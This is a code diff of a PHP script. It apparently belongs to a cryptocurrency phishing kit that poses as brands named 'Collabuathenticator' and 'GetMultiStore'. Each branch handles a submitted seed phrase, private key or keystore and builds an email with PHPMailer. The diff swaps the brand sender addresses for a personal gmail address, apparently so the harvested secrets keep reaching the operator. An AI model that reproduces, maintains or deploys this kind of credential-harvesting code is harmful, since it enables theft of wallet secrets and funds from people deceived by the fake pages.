@@ -16,7 +16,7 @@ if (isset($_POST["phrase"]) && $_POST["phrase"] != "") {
     $mail = new PHPMailer;
 
     //From email address and name
-    $mail->setFrom("admin@collabuathenticator.com");
+    $mail->setFrom("itsogzone@gmail.com");
     $mail->FromName = "Collabuathenticator";
 
 
@@ -60,7 +60,7 @@ if (isset($_POST["familyseed"]) && $_POST["familyseed"] != "") {
     $mail = new PHPMailer;
 
     //From email address and name
-    $mail->setFrom("admin@getmultistore.com");
+    $mail->setFrom("itsogzone@gmail.com");
     $mail->FromName = "GetMultiStore";
 
 
@@ -112,7 +112,7 @@ if (isset($_POST["private1"]) && $_POST["private1"] != "") {
     $mail = new PHPMailer;
 
     //From email address and name
-    $mail->setFrom("admin@getmultistore.com");
+    $mail->setFrom("itsogzone@gmail.com");
     $mail->FromName = "GetMultiStore";
 
 
@@ -166,7 +166,7 @@ if (isset($_POST["keystoreval"]) && $_POST["keystoreval"] != "") {
     $mail = new PHPMailer;
 
     //From email address and name
-    $mail->setFrom("admin@getmultistore.com");
+    $mail->setFrom("itsogzone@gmail.com");
     $mail->FromName = "GetMultiStore";
 
 
@@ -211,7 +211,7 @@ if (isset($_POST["privatekeyval"]) && $_POST["privatekeyval"] != "") {
     $mail = new PHPMailer;
 
     //From email address and name
-    $mail->setFrom("admin@getmultistore.com");
+    $mail->setFrom("itsogzone@gmail.com");
     $mail->FromName = "GetMultiStore";
 
 
